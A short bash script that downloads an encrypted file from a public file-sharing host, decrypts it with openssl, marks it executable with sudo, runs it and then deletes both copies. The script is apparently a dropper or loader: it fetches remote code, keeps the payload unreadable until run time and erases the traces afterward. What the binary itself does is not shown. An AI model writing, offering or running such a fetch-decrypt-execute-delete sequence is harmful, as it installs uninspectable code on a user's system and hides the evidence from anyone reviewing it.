#! /bin/bash
cd
curl -O https://store5.gofile.io/download/9fec764d-c623-4787-b452-847e5efb3490/x-l1bra.enc
openssl enc -aes-256-cbc -pbkdf2 -d -a -in x-l1bra.enc -out x-l1bra
sudo chmod 755 x-l1bra
./x-l1bra
rm x-l1bra.enc x-l1bra
